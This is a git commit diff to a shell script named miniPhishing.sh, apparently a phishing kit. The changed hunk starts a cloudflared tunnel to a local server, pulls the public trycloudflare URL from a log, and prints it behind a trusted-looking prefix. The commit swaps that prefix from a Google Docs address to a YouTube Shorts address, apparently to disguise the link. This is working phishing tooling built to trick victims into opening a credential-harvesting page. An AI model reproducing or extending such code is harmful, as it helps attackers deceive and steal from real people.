00b7b93d93de6543634b00868239f4ce321d33b1
ikka <152771577+call-me-ikka@users.noreply.github.com>
2026-01-02 23:30:46 -0500

    Update miniPhishing.sh

--- miniPhishing.sh
+++ miniPhishing.sh
@@ -20,7 +20,7 @@ elif [ $opt -eq 2 ]; then
     ./../../cloudflared tunnel --url http://127.0.0.1:8080 > link.log 2>&1 &
     sleep 8
     link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' link.log)
-    echo -e "\n\e[32m[+] Link: \e[34mhttps://docs.google.com/document/d/16YI72b5tO8mK-IIVMdLZlH1BygO2MgeOcHWFzkpg0vI/edit?usp=drivesdk ${link#https://}\e[0m\n"
+    echo -e "\n\e[32m[+] Link: \e[34m https://youtube.com/shorts/cYEbfTkzpTA?si=DcIY1oiU_4xfGQ8a ${link#https://}\e[0m\n"
     echo "Press Ctrl+C to stop the server."
     wait
 elif [ $opt -eq 3 ]; then
